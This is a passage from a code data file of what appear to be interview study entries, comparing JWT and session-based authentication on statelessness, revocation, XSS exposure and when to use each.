        'JWT (Stateless): Client sends credentials. Server signs a JSON payload with a secret key and returns it. Client sends JWT. Server verifies signature mathematically. No database lookup required.',
        'Revocation: Sessions can be revoked instantly (delete from Redis). JWTs cannot be easily revoked before they expire unless you build a "blacklist" (which ruins the stateless benefit).',
        'Security: JWTs are vulnerable to XSS if stored in LocalStorage. Sessions (and JWTs) should ideally be stored in `HttpOnly, Secure` cookies to prevent XSS.'
      ],
      example: 'Use JWTs for Server-to-Server API auth or short-lived mobile app tokens. Use traditional Sessions (often using a JWT inside a cookie) for standard web applications.',
      followUps: ['What is the purpose of a Refresh Token?']
    }
  }
];
